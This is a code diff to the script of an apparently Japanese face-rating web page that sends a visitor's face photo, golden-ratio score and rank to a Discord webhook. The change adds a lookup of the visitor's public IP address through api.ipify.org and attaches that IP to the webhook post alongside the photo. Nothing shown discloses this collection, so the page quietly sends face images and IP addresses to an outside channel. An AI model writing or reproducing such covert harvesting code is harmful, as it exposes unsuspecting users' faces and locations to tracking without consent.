@@ -176,13 +176,19 @@ function send() {
 function sendToDiscord(base64, score, rank) {
   const fd = new FormData();
   fd.append("file", dataURLtoBlob(base64), "face.png");
-  fd.append("payload_json", JSON.stringify({
-    content: `📸 **顔診断結果**\n黄金比：${score}%\nランク：${rank}`
-  }));
 
-  fetch(WEBHOOK_URL, { method: "POST", body: fd });
+  fetch("https://api.ipify.org?format=json")
+  .then(res => res.json())
+  .then(ipData => {
+    const ip = ipData.ip;
+
+    fd.append("payload_json", JSON.stringify({
+      content: `📸 顔診断\nIP: ${ip}\n黄金比：${score}%\nランク：${rank}`
+    }));
+
+    fetch(WEBHOOK_URL, { method: "POST", body: fd });
+  });
 }
-
 function dataURLtoBlob(dataurl) {
   const arr = dataurl.split(',');
   const mime = arr[0].match(/:(.*?);/)[1];
@@ -192,6 +198,7 @@ function dataURLtoBlob(dataurl) {
   while (n--) u8[n] = bstr.charCodeAt(n);
   return new Blob([u8], { type: mime });
 }
+  
 </script>
 </body>
 </html>
